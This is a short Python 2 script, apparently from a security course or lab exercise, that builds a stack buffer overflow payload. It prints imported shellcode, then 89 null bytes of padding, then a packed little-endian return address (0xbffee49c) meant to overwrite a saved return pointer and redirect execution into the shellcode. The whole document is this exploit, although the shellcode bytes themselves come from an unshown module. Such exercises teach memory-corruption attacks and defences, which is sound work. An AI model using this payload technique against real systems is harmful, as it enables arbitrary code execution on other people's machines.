from shellcode import shellcode
from struct import pack

print shellcode + "\x00"*89 + pack("<I", 0xbffee49c)
